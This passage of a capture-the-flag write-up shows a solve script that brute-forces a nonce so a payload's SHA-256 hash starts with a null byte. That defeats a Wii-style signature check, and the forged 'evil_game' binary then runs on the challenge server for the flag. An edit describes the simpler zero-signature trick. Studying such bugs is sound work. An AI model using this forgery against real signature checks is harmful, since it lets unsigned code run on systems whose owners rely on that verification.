</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">while</span> <span style="color:#81a1c1;font-weight:bold">True</span><span style="color:#eceff4">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># simple counter (1 to 4 bytes)</span>
</span></span><span style="display:flex;"><span>    nonce_bytes <span style="color:#81a1c1">=</span> nonce<span style="color:#81a1c1">.</span>to_bytes<span style="color:#eceff4">((</span>nonce<span style="color:#81a1c1">.</span>bit_length<span style="color:#eceff4">()</span> <span style="color:#81a1c1">+</span> <span style="color:#b48ead">7</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1">//</span> <span style="color:#b48ead">8</span> <span style="color:#81a1c1;font-weight:bold">or</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">,</span> byteorder<span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;big&#39;</span><span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#81a1c1">=</span> evil_game <span style="color:#81a1c1">+</span> nonce_bytes
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    h <span style="color:#81a1c1">=</span> hashlib<span style="color:#81a1c1">.</span>sha256<span style="color:#eceff4">(</span>payload<span style="color:#eceff4">)</span><span style="color:#81a1c1">.</span>digest<span style="color:#eceff4">()</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> h<span style="color:#eceff4">[</span><span style="color:#b48ead">0</span><span style="color:#eceff4">]</span> <span style="color:#81a1c1">==</span> <span style="color:#b48ead">0</span><span style="color:#eceff4">:</span> <span style="color:#616e87;font-style:italic"># if the first byte is a null byte</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[+] Nonce found in </span><span style="color:#a3be8c">{}</span><span style="color:#a3be8c"> iterations.&#34;</span><span style="color:#81a1c1">.</span>format<span style="color:#eceff4">(</span>nonce<span style="color:#eceff4">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[+] Nonce (hex): </span><span style="color:#a3be8c">{}</span><span style="color:#a3be8c">&#34;</span><span style="color:#81a1c1">.</span>format<span style="color:#eceff4">(</span>nonce_bytes<span style="color:#81a1c1">.</span>hex<span style="color:#eceff4">()))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;[+] Associated hash: </span><span style="color:#a3be8c">{}</span><span style="color:#a3be8c">&#34;</span><span style="color:#81a1c1">.</span>format<span style="color:#eceff4">(</span>h<span style="color:#81a1c1">.</span>hex<span style="color:#eceff4">()))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">with</span> <span style="color:#81a1c1">open</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#34;evil_game&#34;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#34;wb&#34;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">as</span> out<span style="color:#eceff4">:</span>
</span></span><span style="display:flex;"><span>            out<span style="color:#81a1c1">.</span>write<span style="color:#eceff4">(</span>payload<span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>            out<span style="color:#81a1c1">.</span>write<span style="color:#eceff4">(</span>signature<span style="color:#eceff4">)</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    nonce <span style="color:#81a1c1">+=</span> <span style="color:#b48ead">1</span>
</span></span></code></pre></div><pre tabindex="0"><code>$ python3 solve.py
[*] Payload size: 16016 bytes
[*] Signature size: 256 bytes (Expected: 256)
[+] Nonce found in 46 iterations.
[+] Nonce (hex): 2e
[+] Associated hash: 00cbf278e41a69596c814a573acfb7ba5fcfe228357f2c0f25d3ce6e7feb4fad
</code></pre><p>We send the locally compiled payload to the remote server:</p>
<pre tabindex="0"><code>&gt;scp -P 15739 evil_game wii-user@dyn-02.xmas.root-me.org:/app/games
wii-user@dyn-02.xmas.root-me.org&#39;s password:
evil_game                                                                             100%   16KB 662.2KB/s   00:00
</code></pre><div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚îå‚îÄ<span style="color:#81a1c1">[</span>wii-user@wiinterhack<span style="color:#81a1c1">]</span> - <span style="color:#81a1c1">[</span>/app<span style="color:#81a1c1">]</span> - <span style="color:#81a1c1">[</span>6<span style="color:#81a1c1">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ<span style="color:#81a1c1">[</span>$<span style="color:#81a1c1">]</span> chmod +x games/evil_game                                                                           <span style="color:#81a1c1">[</span>11:40:45<span style="color:#81a1c1">]</span>
</span></span><span style="display:flex;"><span>‚îå‚îÄ<span style="color:#81a1c1">[</span>wii-user@wiinterhack<span style="color:#81a1c1">]</span> - <span style="color:#81a1c1">[</span>/app<span style="color:#81a1c1">]</span> - <span style="color:#81a1c1">[</span>7<span style="color:#81a1c1">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ<span style="color:#81a1c1">[</span>$<span style="color:#81a1c1">]</span> ./launcher games/evil_game                                                                         <span style="color:#81a1c1">[</span>11:40:53<span style="color:#81a1c1">]</span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">[</span>i<span style="color:#81a1c1">]</span> Unciphering signature with public key <span style="color:#81a1c1">(</span>m <span style="color:#81a1c1">=</span> sig^e mod n<span style="color:#81a1c1">)</span>.
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">[</span>i<span style="color:#81a1c1">]</span> DECRYPTED HASH:
</span></span><span style="display:flex;"><span>        <span style="color:#b48ead">00</span> <span style="color:#b48ead">59</span> DF 5E D5 <span style="color:#b48ead">96</span> <span style="color:#b48ead">49</span> B0
</span></span><span style="display:flex;"><span>        F3 <span style="color:#b48ead">88</span> <span style="color:#b48ead">65</span> <span style="color:#b48ead">68</span> F4 0A 8F AF
</span></span><span style="display:flex;"><span>        <span style="color:#b48ead">50</span> FF 4B <span style="color:#b48ead">37</span> C9 D1 9C BB
</span></span><span style="display:flex;"><span>        2D <span style="color:#b48ead">84</span> <span style="color:#b48ead">24</span> <span style="color:#b48ead">03</span> 5B <span style="color:#b48ead">27</span> <span style="color:#b48ead">70</span> <span style="color:#b48ead">66</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">[</span>i<span style="color:#81a1c1">]</span>COMPUTED HASH:
</span></span><span style="display:flex;"><span>        <span style="color:#b48ead">00</span> CB F2 <span style="color:#b48ead">78</span> E4 1A <span style="color:#b48ead">69</span> <span style="color:#b48ead">59</span>
</span></span><span style="display:flex;"><span>        6C <span style="color:#b48ead">81</span> 4A <span style="color:#b48ead">57</span> 3A CF B7 BA
</span></span><span style="display:flex;"><span>        5F CF E2 <span style="color:#b48ead">28</span> <span style="color:#b48ead">35</span> 7F 2C 0F
</span></span><span style="display:flex;"><span>        <span style="color:#b48ead">25</span> D3 CE 6E 7F EB 4F AD
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">[</span>GOOD<span style="color:#81a1c1">]</span> Signature is VALID!
</span></span><span style="display:flex;"><span><span style="color:#81a1c1">[</span>*<span style="color:#81a1c1">]</span> Evil game executed
</span></span><span style="display:flex;"><span>RM<span style="color:#81a1c1">{</span>Wii_W4s_S3cUr3_but_N0t_for_Fail0verflow!<span style="color:#81a1c1">}</span>
</span></span></code></pre></div><p>Happy Christmas</p>
<hr>
<p><strong>EDIT</strong>: The creator of the challenge himself stated the following:</p>
<p><img src="/images/2025-12-25-root-xmas/note_unintended.png" alt=""></p>
<p>Indeed, that hint could also be found on the <a href="https://wiibrew.org/wiki/Signing_bug">Wii Brew wiki</a>, but I completely forgot about it:</p>
<blockquote>
<p>The process can be simplified further by taking advantage of the mathematical properties of RSA. Given the signature m, and the public key (e, n), the decrypted signature is calculated as me mod n. A zero signature (m = 0) always results in a zero result, regardless of the values of e and n (that is, regardless of the certificate that is used to check the signature). All we have to do is zero out the signature and get a guaranteed result of all zeroes.</p>
</blockquote>
<p>So the solution was actually even simpler. Oops.</p>

  

  </main>
  <footer>
    
  </footer>
</body>
</html>
